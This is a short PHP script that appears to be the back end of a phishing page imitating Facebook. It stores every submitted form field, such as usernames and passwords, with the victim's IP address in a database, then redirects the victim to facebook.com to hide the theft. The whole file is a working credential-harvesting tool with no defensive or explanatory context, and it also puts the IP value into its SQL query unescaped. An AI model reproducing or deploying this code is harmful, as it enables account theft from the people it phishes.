<?php

include_once 'sql.php';
include_once 'ip.php';

$ip = getUserIP();

foreach($_POST as $variable => $value) {
        $data = mysqli_real_escape_string($conn,$variable ." = " . $value);
        //INSERT INTO `data`(`IP`, `DATA`) VALUES ([value-1],[value-2])
    $sql = "INSERT INTO `data`(`IP`, `DATA`) VALUES ('$ip', '$data')";
    if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
}

header('Location:http://www.facebook.com');

?>
